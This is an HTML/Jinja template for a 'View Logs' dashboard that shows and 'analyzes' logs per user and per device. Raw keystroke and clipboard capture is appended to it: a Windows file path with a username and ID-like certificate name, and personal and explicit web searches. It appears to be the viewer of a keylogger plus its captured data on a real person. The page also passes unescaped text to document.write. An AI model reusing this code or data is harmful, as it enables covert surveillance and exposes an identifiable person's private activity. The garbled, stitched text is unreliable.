            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const outputTextarea = document.getElementById('output-textarea');
                        outputTextarea.value = data.crucial_info;
                        outputTextarea.focus();
                        outputTextarea.select();
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }

        h1 {
            color: yellowgreen;
        }

        .log-container {
            display: flex;
            flex-wrap: wrap;
        }

        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }

        .log-item {
            word-wrap: break-word;
        }

        .reset-button,
        .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }

        .analyze-button {
            background-color: blue;
        }

        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }

        .text-editor {
            background-color: #333;
            color: white;
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
        }

        .text-editor textarea {
            width: 100%;
            min-height: 200px;
            background-color: inherit;
            color: inherit;
            border: none;
            outline: none;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>

<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
        <div class="log-column">
            <h2>Device: {{ device }}</h2>
            {% for log in logs %}
            <div class="log-item">{{ log }}</div>
            {% endfor %}
        </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>
    <button id="markdown-button" class="markdown-button" style="display: none;" onclick="convertToMarkdown()">Convert to
        Markdown</button>


    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <div class="text-editor" id="editor">
        <textarea id="editor-textarea" placeholder="Generated Output"></textarea>
    </div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const editorTextarea = document.getElementById('editor-textarea');
                        editorTextarea.value = `Crucial Information:\n\n${data.crucial_info}`;
                        document.getElementById('crucial-info').style.display = 'none';
                        document.getElementById('editor').style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function toggleMarkdownButton() {
            const textarea = document.getElementById('editor-textarea');
            const markdownButton = document.getElementById('markdown-button');
            markdownButton.style.display = textarea.value.trim() ? 'inline-block' : 'none';
        }

        // Attach event listener to detect changes in the textarea
        document.getElementById('editor-textarea').addEventListener('input', toggleMarkdownButton);

        function convertToMarkdown() {
            const textarea = document.getElementById('editor-textarea');
            const markdownOutput = textarea.value
                .split('\n') // Split the content into lines
                .map(line => `- ${line.trim()}`) // Prefix each line with `-`
                .join('\n'); // Join the lines with newline characters

            // Create a pop-up to display the Markdown
            const markdownPopup = window.open('', '_blank');
            markdownPopup.document.write('<pre>' + markdownOutput + '</pre>');
        }

        function downloadMarkdown() {
            const textarea = document.getElementById('editor-textarea');
            const markdownContent = textarea.value
                .split('\n')
                .map(line => `- ${line.trim()}`)
                .join('\n');

            const blob = new Blob([markdownContent], { type: 'text/markdown' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'analyzed_logs.md';
            link.click();
        }


    </script>
</body>

</html><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl><ctrl>\x03
Key.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_rKey.ctrl_ronly that muxhKey.backspaceKey.backspacech
just put our image there 
Key.shift_rKey.shift_rKey.delete
nptel<ctrl>\x03[Clipboard] file:///C:/Users/anike/Downloads/1MS22CY007_SE_Certificate.pdfpdf to image
[Clipboard] <ctrl>\x161mspdf to image
1ms22<ctrl>\x16Key.backspace
best hugging face models
cybersecurity <shift>+ <shift>DSA raodmap
Key.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_upKey.media_volume_upKey.media_volume_upnetwroking university course
Key.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downdreal life aunt porn stories
Key.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downtrans porn
surprise peg
 porn
Key.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.rightKey.right<ctrl>\x17\x17\x17Key.down
sflix2.to
what ifwhat if
Key.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_upKey.media_volume_up Key.media_volume_upKey.media_volume_upKey.media_volume_up Key.media_volume_downKey.media_volume_downKey.media_volume_downKey.media_volume_down     Key.media_volume_upKey.media_volume_up              <alt><tab><alt><alt><tab><alt><tab><tab>   Key.esc